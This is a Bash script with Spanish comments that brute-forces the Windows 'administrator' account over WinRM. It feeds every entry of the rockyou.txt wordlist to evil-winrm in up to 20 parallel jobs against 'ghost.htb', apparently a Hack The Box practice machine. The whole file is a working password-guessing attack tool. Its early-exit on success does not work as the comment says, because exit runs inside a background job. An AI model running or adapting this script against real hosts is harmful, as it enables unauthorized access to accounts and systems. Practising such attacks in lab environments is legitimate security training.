#!/bin/bash

host="ghost.htb" # Reemplaza con el nombre de host o IP de la máquina
user="administrator"
password_file="/usr/share/wordlists/rockyou.txt"
max_threads=20

if [ ! -f "$password_file" ]; then
	echo "No se encontró el archivo $password_file"
	exit 1
fi

# Función para ejecutar evil-winrm y verificar la salida
function execute_evil_winrm {
	local password="$1"

	printf "Intentando con contraseña: %s\r" "$password"
	evil-winrm -i $host -u $user -p $password >/dev/null 2>&1
	local result=$?

	if [ $result -eq 0 ]; then
		printf "\nContraseña correcta encontrada: %s\n" "$password"
		exit 0 # Termina el script cuando se encuentra la contraseña correcta
	fi
}

# Iterar sobre las contraseñas en el archivo utilizando hilos
while IFS= read -r password; do
	execute_evil_winrm "$password" &
	# Limitar el número de hilos activos
	while [ $(jobs | wc -l) -ge $max_threads ]; do
		sleep 0.5
	done
done <"$password_file"

wait # Espera a que todos los hilos terminen antes de finalizar el script
